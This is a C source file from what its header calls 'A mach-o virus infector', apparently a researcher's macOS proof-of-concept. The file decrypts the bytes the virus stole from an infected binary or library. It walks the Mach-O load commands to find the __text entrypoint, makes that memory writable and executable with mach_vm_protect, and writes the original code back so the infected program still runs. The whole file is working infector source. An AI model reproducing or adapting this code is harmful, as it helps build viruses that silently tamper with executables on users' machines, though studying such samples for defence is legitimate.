/*
 *        (`-.           _  .-')                .-')   ,---. 
 *     _(OO  )_        ( \( -O )              ( OO ). |   | 
 * ,--(_/   ,. \ ,-.-') ,------. ,--. ,--.   (_)---\_)|   | 
 * \   \   /(__/ |  |OO)|   /`. '|  | |  |   /    _ | |   | 
 *  \   \ /   /  |  |  \|  /  | ||  | | .-') \  :` `. |   | 
 *   \   '   /,  |  |(_/|  |_.' ||  |_|( OO ) '..`''.)|  .' 
 *    \     /__),|  |_.'|  .  '.'|  | | `-' /.-._)   \`--'  
 *     \   /   (_|  |   |  |\  \('  '-'(_.-' \       /.--.  
 *      `-'      `--'   `--' '--' `-----'     `-----' '--'  
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * restore_functions.c
 *
 * Functions related to restore the stolen bytes
 *
 */

#include "restore_functions.h"
#include "find_functions.h"
#include "encryption.h"

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <dlfcn.h>
#include <libgen.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach/mach_traps.h>
#include <mach/mach_types.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>


/*
 * function that will decrypt and restore the stolen bytes of the main binary
 */
void
restore_payload(virus_payload_info_t *virusInfo)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    uint8_t *cryptedBuffer = malloc(virusInfo->payloadSize);
    // position into linkedit plus position of encrypted bytes
    memcpy(cryptedBuffer, virusInfo->payloadLocation, virusInfo->payloadSize);
#if DEBUG
    printf("crypted bytes from buffer %x\n", *(uint32_t*)cryptedBuffer);
#endif
    // decrypt those bytes
    decrypt_bytes(cryptedBuffer, virusInfo->payloadSize);
#if DEBUG
    printf("decrypted buffer %x\n", *(uint32_t*)cryptedBuffer);
#endif
    // copy back decrypted buffer into the infected binary
    // find the location of the infected binary
    //    find_machoimage(&targetAddress, &targetSize, 0);
#if DEBUG
    printf("Start address %llx\n", (uint64_t)virusInfo->infectedImage);
#endif
    // find the entrypoint of the infected binary
    uint8_t *entrypoint = find_entrypoint(virusInfo->infectedImage);
    // change protections, copy the decrypted bytes, and restore protections
    mach_vm_protect(mach_task_self(), (mach_vm_address_t)entrypoint, (mach_vm_size_t)virusInfo->payloadSize, FALSE, VM_PROT_ALL);
    memcpy((uint8_t*)entrypoint, cryptedBuffer, virusInfo->payloadSize);
    mach_vm_protect(mach_task_self(), (mach_vm_address_t)entrypoint, (mach_vm_size_t)virusInfo->payloadSize, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
}

/*
 * function that will decrypt and restore the stolen bytes of the encrypted library
 */
void
restore_payload_library(virus_payload_info_t *virusInfo)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    uint8_t *cryptedBuffer = malloc(sizeof(uint8_t) * virusInfo->payloadSize);
    // position into linkedit plus position of encrypted bytes
    memcpy(cryptedBuffer, virusInfo->payloadLocation, virusInfo->payloadSize);
#if DEBUG
    printf("crypted bytes from buffer %x\n", *(uint32_t*)cryptedBuffer);
#endif
    // decrypt those bytes
    decrypt_bytes(cryptedBuffer, virusInfo->payloadSize);
#if DEBUG
    printf("decrypted buffer %x\n", *(uint32_t*)cryptedBuffer);
#endif
    // copy back decrypted buffer into the infected binary
    // find the location of the infected binary
    struct mach_header *mh = (struct mach_header*)virusInfo->infectedImage;
    uint32_t headerSize = 0;
    uint8_t *address = NULL;
    uint8_t *entrypoint = NULL;
    uint64_t textBaseAddress = 0;
    
    if (mh->magic == MH_MAGIC) headerSize = sizeof(struct mach_header);
    else if (mh->magic == MH_MAGIC_64) headerSize = sizeof(struct mach_header_64);
    else return;
    
    // first load cmd address
    address = (uint8_t*)virusInfo->infectedImage + headerSize;
    
    struct load_command *loadCommand = NULL;
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        loadCommand = (struct load_command*)address;
        // 32bits
        if (loadCommand->cmd == LC_SEGMENT)
        {
            struct segment_command *segmentCommand = (struct segment_command*)address;
            
            if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
            {
                textBaseAddress = segmentCommand->vmaddr;
                // address of the first section
                uint8_t *sectionAddress = address + sizeof(struct segment_command);
                struct section *sectionCommand = NULL; 
                // iterate thru all sections
                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                {
                    sectionCommand = (struct section*)(sectionAddress);
                    if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                    {
                        // retrieve the offset for this section
                        entrypoint = (uint8_t*)sectionCommand->addr;
                    }
                    sectionAddress += sizeof(struct section);
                }
            }
        }
        else if (loadCommand->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *segmentCommand = (struct segment_command_64*)address;
            if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
            {
                textBaseAddress = segmentCommand->vmaddr;
                // address of the first section
                uint8_t *sectionAddress = address + sizeof(struct segment_command_64);
                struct section_64 *sectionCommand = NULL; 
                // iterate thru all sections
                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                {
                    sectionCommand = (struct section_64*)(sectionAddress);
                    if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                    {
                        // retrieve the offset for this section
                        entrypoint = (uint8_t*)sectionCommand->addr;
                    }
                    sectionAddress += sizeof(struct section_64);
                }
            }
        }
        
        address += loadCommand->cmdsize;
    }
    entrypoint = (uint8_t*)((uint64_t)virusInfo->infectedImage + (entrypoint - textBaseAddress));
#if DEBUG
    printf("Start address %llx\n", (uint64_t)entrypoint);
#endif
    // change protections, copy the decrypted bytes, and restore protections
    mach_vm_protect(mach_task_self(), (mach_vm_address_t)entrypoint, (mach_vm_size_t)virusInfo->payloadSize, FALSE, VM_PROT_ALL);
    memcpy((uint8_t*)entrypoint, cryptedBuffer, virusInfo->payloadSize);
    mach_vm_protect(mach_task_self(), (mach_vm_address_t)entrypoint, (mach_vm_size_t)virusInfo->payloadSize, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
    free(cryptedBuffer);
}
